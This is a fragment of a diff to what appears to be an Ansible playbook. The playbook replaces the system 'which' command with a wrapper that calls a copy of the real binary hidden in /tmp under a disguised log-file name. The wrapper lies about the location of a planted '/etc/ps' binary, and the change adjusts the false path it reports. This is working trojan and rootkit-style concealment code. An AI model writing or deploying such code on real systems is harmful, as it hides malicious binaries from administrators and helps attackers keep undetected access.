@@ -10,4 +10,4 @@
     - name: "populate new which file line 1"
       shell: "echo '#!/bin/sh' >> /usr/bin/which"
     - name: "populate new which file line 2"
-      shell: "echo 'if /tmp/dnsmasq-tmp-log-199sjduse8kxp200oz8s $@ | grep -q '/etc/ps'; then echo '/usr/bin/ps'; else /tmp/dnsmasq-tmp-log-199sjduse8kxp200oz8s $@; fi;' >> /usr/bin/which"
+      shell: "echo 'if /tmp/dnsmasq-tmp-log-199sjduse8kxp200oz8s $@ | grep -q '/etc/ps'; then echo '/bin/ps'; else /tmp/dnsmasq-tmp-log-199sjduse8kxp200oz8s $@; fi;' >> /usr/bin/which"
